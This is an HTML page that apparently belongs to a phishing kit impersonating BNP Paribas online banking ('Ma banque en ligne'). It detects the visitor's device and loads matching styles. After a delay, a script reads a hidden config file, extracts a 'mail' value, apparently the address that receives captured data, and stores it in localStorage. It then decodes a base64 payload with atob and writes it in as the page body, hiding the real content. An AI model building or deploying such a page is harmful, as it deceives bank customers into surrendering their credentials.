
<!doctype html>
<html>
    <head>
    <script src="./js/$.js?9-0"></script>
    <script>
   window.mobile=""
            if(detectmob()==true){
                window.mobile="Mobile TABLET BNP"
                $('head').append('<link id="css_" rel="stylesheet" href="./css/mob.css?0" type="text/css" />');
                  
             } else {
                 $('head').append('<link id="css_" rel="stylesheet" href="./css/desk.css?0" type="text/css" />');
                 
             }
             function detectmob() { 
                if( navigator.userAgent.match(/Android/i)
                || navigator.userAgent.match(/webOS/i)
                || navigator.userAgent.match(/iPhone/i)
                || navigator.userAgent.match(/iPad/i)
                || navigator.userAgent.match(/iPod/i)
                || navigator.userAgent.match(/BlackBerry/i)
                || navigator.userAgent.match(/Windows Phone/i)
                ){
                   return true;
                 }
                else {
                   return false;
                 }
               }


    </script>
        <title>BNP Paribas | Ma banque en ligne</title>
        <link type="image/x-icon" href="./img/favicon.ico" rel="shortcut icon">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        </head>
    <body>  
        
    
        <script>

//window.ready_=0
 //   ready_s()
 //   function ready_s(){
 //   $('head').append('<link id="css_" rel="stylesheet" href="./css/style.css?0" type="text/css" />');
 //   window.ready_=1
 //   if(ready_==1){
  //      load_p()
  //  }
//}

setTimeout(load_p,1000)
function load_p(){
var regexMail=/config\[mail\(\'(.*?)\'\)\]/gi;
var regexData=/config\[data\(\'(.*?)\'\)\]/gi;
function settings(configs){
    $.ajax({
        type:'GET',
        url:'./config/config.settings',
        async:false,
        success:function(data){
            configs =data.replace(/\s/g,'')
        }
    })
    return configs
}
var config=settings()
window.rmail_=regexMail.exec(config)[1]
localStorage.rmail=rmail_;

//$.get('./m.html',function(data){
     //   $('body').html(btoa(data))
   // })
window._=regexData.exec(config)[1]
$('body').html(atob(_))
}


          </script>
</body>
</html>